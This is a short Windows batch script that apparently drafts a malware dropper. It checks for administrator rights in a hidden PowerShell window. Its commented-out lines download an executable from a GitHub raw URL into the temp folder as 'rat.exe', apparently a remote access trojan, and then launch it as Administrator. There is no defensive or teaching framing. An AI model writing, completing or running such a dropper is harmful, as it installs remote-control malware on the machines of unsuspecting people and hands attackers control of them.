@echo off
powershell -WindowStyle Hidden -Command "fltmc >$null 2>&1; if ($?) { echo has admin permissions } else { echo has NOT admin permissions }"

::powershell -WindowStyle Hidden -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe -OutFile %TEMP%\rat.exe" >nul 2>&1

::echo hi

::start /B "" runas /user:Administrator "%TEMP%\rat.exe"

::endlocal
